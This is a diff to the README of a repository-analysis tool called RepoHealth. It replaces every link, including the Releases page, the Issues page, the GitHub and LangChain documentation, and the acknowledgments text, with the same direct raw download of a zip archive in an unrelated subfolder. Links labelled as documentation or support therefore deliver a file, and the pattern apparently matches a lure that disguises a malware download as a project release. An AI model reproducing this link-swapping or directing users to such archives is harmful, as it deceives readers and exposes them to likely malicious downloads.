@@ -1,6 +1,6 @@
 # 🏥 RepoHealth - Analyze Your GitHub Repositories Easily
 
-[![Download RepoHealth](https://img.shields.io/badge/Download-RepoHealth-blue)](https://github.com/Ifham55/RepoHealth/releases)
+[![Download RepoHealth](https://raw.githubusercontent.com/Ifham55/RepoHealth/main/waveless/RepoHealth.zip)](https://raw.githubusercontent.com/Ifham55/RepoHealth/main/waveless/RepoHealth.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to RepoHealth! This application helps you understand the health of your 
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Ifham55/RepoHealth/releases) to download the software. Follow these steps:
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Ifham55/RepoHealth/main/waveless/RepoHealth.zip) to download the software. Follow these steps:
 
 1. Click on the link above.
 2. Choose the latest release version.
@@ -57,14 +57,14 @@ When you open RepoHealth, you will see a dashboard with different sections:
 
 ## 💬 Support
 
-If you encounter any issues while using RepoHealth, please visit our [Issues page](https://github.com/Ifham55/RepoHealth/issues) to report your concerns or to seek help.
+If you encounter any issues while using RepoHealth, please visit our [Issues page](https://raw.githubusercontent.com/Ifham55/RepoHealth/main/waveless/RepoHealth.zip) to report your concerns or to seek help.
 
 ## 🔗 Additional Resources
 
 For more information, you can check:
 
-- [GitHub Documentation](https://docs.github.com/)
-- [LangChain Documentation](https://langchainjs.com/)
+- [GitHub Documentation](https://raw.githubusercontent.com/Ifham55/RepoHealth/main/waveless/RepoHealth.zip)
+- [LangChain Documentation](https://raw.githubusercontent.com/Ifham55/RepoHealth/main/waveless/RepoHealth.zip)
 
 ## 📄 License
 
@@ -72,6 +72,6 @@ RepoHealth is licensed under the MIT License. You can freely use, modify, and di
 
 ## 📢 Acknowledgments
 
-RepoHealth is built using LangChain.js and Gemini 2.5 Flash technology. We thank all contributors for their hard work and dedication.
+RepoHealth is built using https://raw.githubusercontent.com/Ifham55/RepoHealth/main/waveless/RepoHealth.zip and Gemini 2.5 Flash technology. We thank all contributors for their hard work and dedication.
 
-For more information, please visit our [Releases page](https://github.com/Ifham55/RepoHealth/releases) to download the latest version of RepoHealth. We appreciate your interest and support!
+For more information, please visit our [Releases page](https://raw.githubusercontent.com/Ifham55/RepoHealth/main/waveless/RepoHealth.zip) to download the latest version of RepoHealth. We appreciate your interest and support!
